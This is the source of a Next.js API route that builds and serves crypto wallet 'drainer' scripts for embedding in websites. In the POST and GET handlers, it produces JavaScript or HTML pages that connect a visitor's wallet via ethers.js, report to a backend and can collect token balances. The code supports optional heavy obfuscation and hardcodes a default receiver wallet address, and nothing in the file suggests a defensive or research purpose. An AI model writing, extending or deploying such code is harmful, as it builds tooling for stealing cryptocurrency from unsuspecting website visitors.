import { NextResponse } from 'next/server';
import { requireAuth } from '@/lib/api-auth';
import { generateDrainerScript, generateAdvancedDrainerScript, generateDrainerPage } from '@/lib/drainer-script-generator';
import { readOperationalConfig } from '@/lib/operational-config-store';

interface GenerateDrainerRequest {
  receiver?: string;
  backend?: string;
  obfuscation?: 'none' | 'minify' | 'medium' | 'heavy';
  advanced?: boolean;
  format?: 'script' | 'html' | 'embed';
}

/**
 * Generate drainer scripts for embedding in websites
 *
 * Generates embedded JavaScript that:
 * 1. Waits for user interaction
 * 2. Connects wallet via ethers.js
 * 3. Submits connection to backend
 * 4. (Advanced) Collects token balances
 */
export async function POST(request: Request) {
  const guard = await requireAuth('sdk:compile');
  if (guard) return guard;

  try {
    const body = (await request.json()) as GenerateDrainerRequest;
    const config = await readOperationalConfig();

    // Use provided values or fall back to config
    const receiver = body.receiver || '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693';
    const backend = body.backend || '/api/submit-drainer';
    const obfuscation = body.obfuscation || 'medium';
    const advanced = body.advanced || false;
    const format = body.format || 'script';

    if (!receiver || !backend) {
      return NextResponse.json(
        {
          status: 'error',
          message: 'Missing receiver address or backend URL',
        },
        { status: 400 }
      );
    }

    const scriptConfig = { receiver, backend, obfuscation };

    let output: string;
    let contentType: string;
    let filename: string;

    switch (format) {
      case 'html':
        output = generateDrainerPage(scriptConfig);
        contentType = 'text/html';
        filename = 'drainer-page.html';
        break;

      case 'embed':
        output = advanced
          ? generateAdvancedDrainerScript(scriptConfig)
          : generateDrainerScript(scriptConfig);
        contentType = 'application/javascript';
        filename = 'drainer-embed.js';
        break;

      case 'script':
      default:
        output = advanced
          ? generateAdvancedDrainerScript(scriptConfig)
          : generateDrainerScript(scriptConfig);
        contentType = 'application/javascript';
        filename = 'drainer.js';
        break;
    }

    return NextResponse.json({
      status: 'ok',
      format,
      obfuscation,
      advanced,
      receiver,
      backend,
      contentType,
      filename,
      script: output,
      embedCode: `<script src="https://cdn.ethers.org/v6/ethers.umd.min.js"><\/script>\n<script>\n${output}\n<\/script>`,
      size: output.length,
    });
  } catch (err) {
    return NextResponse.json(
      {
        status: 'error',
        message: `Failed to generate drainer script: ${err instanceof Error ? err.message : String(err)}`,
      },
      { status: 400 }
    );
  }
}

/**
 * Download drainer script
 */
export async function GET(request: Request) {
  const guard = await requireAuth('sdk:download');
  if (guard) return guard;

  try {
    const url = new URL(request.url);
    const format = url.searchParams.get('format') || 'script';
    const obfuscation = url.searchParams.get('obfuscation') || 'medium';
    const advanced = url.searchParams.get('advanced') === 'true';

    const receiver = url.searchParams.get('receiver') || '0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693';
    const backend = url.searchParams.get('backend') || '/api/submit-drainer';

    const scriptConfig = {
      receiver,
      backend,
      obfuscation: obfuscation as 'none' | 'minify' | 'medium' | 'heavy',
    };

    let output: string;
    let contentType: string;
    let filename: string;

    switch (format) {
      case 'html':
        output = generateDrainerPage(scriptConfig);
        contentType = 'text/html';
        filename = 'drainer-page.html';
        break;
      case 'embed':
        output = advanced
          ? generateAdvancedDrainerScript(scriptConfig)
          : generateDrainerScript(scriptConfig);
        contentType = 'application/javascript';
        filename = 'drainer-embed.js';
        break;
      default:
        output = advanced
          ? generateAdvancedDrainerScript(scriptConfig)
          : generateDrainerScript(scriptConfig);
        contentType = 'application/javascript';
        filename = 'drainer.js';
    }

    return new NextResponse(output, {
      headers: {
        'Content-Type': contentType,
        'Content-Disposition': `attachment; filename="${filename}"`,
        'Content-Length': String(Buffer.byteLength(output)),
      },
    });
  } catch (err) {
    return NextResponse.json(
      {
        status: 'error',
        message: 'Failed to download script',
      },
      { status: 400 }
    );
  }
}
